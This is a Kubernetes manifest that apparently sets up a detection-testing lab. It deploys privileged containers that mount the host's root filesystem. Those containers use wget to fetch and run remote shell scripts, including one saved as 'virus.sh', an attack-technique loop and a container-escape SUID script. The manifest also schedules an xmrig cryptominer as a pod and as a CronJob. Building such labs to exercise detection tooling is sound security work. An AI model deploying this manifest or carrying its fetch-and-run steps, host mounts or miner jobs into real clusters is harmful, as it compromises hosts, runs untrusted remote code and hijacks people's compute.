# CDR
apiVersion: apps/v1
kind: Deployment
metadata:
  name: alpine-cdr-deployment
  labels:
    app: alpine-cdr
spec:
  replicas: 3
  selector:
    matchLabels:
      app: alpine-cdr
  template:
    metadata:
      labels:
        app: alpine-cdr
    spec:
      containers:
      - name: malicous-container
        image: alpine:latest
        securityContext:
          privileged: true
          capabilities:
            add:
              - SYS_ADMIN
              - NET_ADMIN
        volumeMounts:
          - name: host
            mountPath: /host
        command:
          - /bin/sh
          - -c
          - |
            wget -q https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/malicous-container/malicous-container.sh -O virus.sh && \
            chmod +x virus.sh && \
            sh virus.sh && \
            sleep 3600
# Attk Loop 
      - name: atk-ttp-test-runner
        image: alpine:latest
        securityContext:
          privileged: true
          capabilities:
            add:
              - SYS_ADMIN
              - NET_ADMIN
        volumeMounts:
          - name: host
            mountPath: /host
        command:
          - /bin/sh
          - -c
          - |
            wget -q https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/build-files/atk-ttp-loop.sh -O atk-ttp-loop.sh && \
            chmod +x atk-ttp-loop.sh && \
            ./atk-ttp-loop.sh && \
            sleep 3600
# Container Escape - SUID Detection 
      - name: suid-detection-container
        image: ubuntu:20.04
        securityContext:
          privileged: true
          capabilities:
            add:
              - SYS_ADMIN
              - AUDIT_CONTROL
        volumeMounts:
          - name: host
            mountPath: /host
        command:
          - /bin/bash
          - -c
          - |
            apt-get update && \
            apt-get install -y auditd inotify-tools wget && \
            mkdir -p /mnt/shared && \
            mount --bind /host/tmp /mnt/shared && \
            wget -q https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/build-files/suid_script.sh -O /usr/local/bin/suid_script.sh && \
            chmod +x /usr/local/bin/suid_script.sh && \
            /usr/local/bin/suid_script.sh detect && \
            tail -f /dev/null

      volumes:
        - name: host
          hostPath:
            path: /
            type: Directory
## Crytpo Miners and Chron Jobs 
---
apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    run: miner-threat
  name: miner-threat-example
spec:
  containers:
  - image: zsco/xmrig-docker:latest
    name: miner-threat
    resources: {}
  dnsPolicy: ClusterFirst
  restartPolicy: Always
status: {}

---
apiVersion: batch/v1
kind: CronJob
metadata:
  name: cryptominer-cron
  labels:
    app: cryptominer
spec:
  schedule: "*/30 * * * *"                  # Executes every 30 minutes [MITRE T1053.005: Scheduled Task/Job]
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: cryptominer-scheduled-task
            image: zsco/xmrig-docker:latest 
          restartPolicy: OnFailure